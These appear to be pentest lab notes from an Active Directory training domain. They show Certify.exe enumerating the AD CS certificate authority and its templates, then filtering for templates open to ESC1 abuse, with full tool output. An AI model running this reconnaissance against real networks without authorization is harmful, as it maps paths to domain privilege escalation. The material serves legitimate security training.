- List all certificate templates.
```
PS C:\AD\MyTools> .\Certify.exe find

      _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.1.0                               

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'

[*] Listing info about the Enterprise CA 'moneycorp-MCORP-DC-CA'

    Enterprise CA Name            : moneycorp-MCORP-DC-CA
    DNS Hostname                  : mcorp-dc.moneycorp.local
    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
    Enrollment Agent Restrictions : None

[*] Available Certificates Templates :

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : User
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Users            S-1-5-21-335606122-960912869-3279953914-513
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : EFS
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Encrypting File System
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Users            S-1-5-21-335606122-960912869-3279953914-513
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : Administrator
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Microsoft Trust List Signing, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : EFSRecovery
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : File Recovery
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : Machine
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Computers        S-1-5-21-335606122-960912869-3279953914-515
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : DomainController
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : WebServer
    Schema Version                        : 1
    Validity Period                       : 2 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SubCA
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : <null>
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : DomainControllerAuthentication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication, Smart Card Logon
    mspki-certificate-application-policy  : Client Authentication, Server Authentication, Smart Card Logon
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : DirectoryEmailReplication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Directory Service Email Replication
    mspki-certificate-application-policy  : Directory Service Email Replication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : KerberosAuthentication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DOMAIN_DNS, SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
    mspki-certificate-application-policy  : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Agent
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Certificate Request Agent
    mspki-certificate-application-policy  : Certificate Request Agent
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Users
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 1
    Application Policies                  : Certificate Request Agent
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : HTTPSCertificates
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : CA-Integration
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519



Certify completed in 00:00:15.7451312
```

- Find certificate templates vulnerable to ESC1 (`enrolleeSuppliesSubject`).
```
PS C:\AD\MyTools> .\Certify.exe find /enrolleeSuppliesSubject

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'

[*] Listing info about the Enterprise CA 'moneycorp-MCORP-DC-CA'

    Enterprise CA Name            : moneycorp-MCORP-DC-CA
    DNS Hostname                  : mcorp-dc.moneycorp.local
    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
    Enrollment Agent Restrictions : None
Enabled certificate templates where users can supply a SAN:
    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : WebServer
    Schema Version                        : 1
    Validity Period                       : 2 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SubCA
    Schema Version                        : 1
    Validity Period                       : 2 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
